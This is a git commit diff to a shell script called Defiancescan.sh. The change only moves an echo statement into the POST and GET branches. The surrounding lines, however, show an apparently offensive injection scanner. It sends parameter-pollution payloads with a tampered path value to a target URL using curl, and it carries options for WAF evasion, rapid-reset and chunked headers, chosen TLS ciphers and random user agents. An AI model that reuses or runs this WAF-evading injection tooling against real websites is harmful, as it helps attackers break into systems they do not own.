df199c79741c629da729409340ce5293458fd4c3
Skokoo <nourriwilliam789@gmail.com>
2026-08-02 10:42:48 +0700

    Update Defiancescan.sh

--- Imcurvin/Defiancescan.sh
+++ Imcurvin/Defiancescan.sh
@@ -213,9 +213,8 @@ else
   output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
 fi
 
-echo -e "$output_text"
-
           if [ "$REQ_METHOD" = "POST" ]; then
+echo -e "$output_text"
           curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
             curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -223,6 +222,7 @@ echo -e "$output_text"
             -w "%{time_total}|%{http_code}" \
             "${target_url}${default_path}")
         else
+echo -e "$output_text"
           curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null \
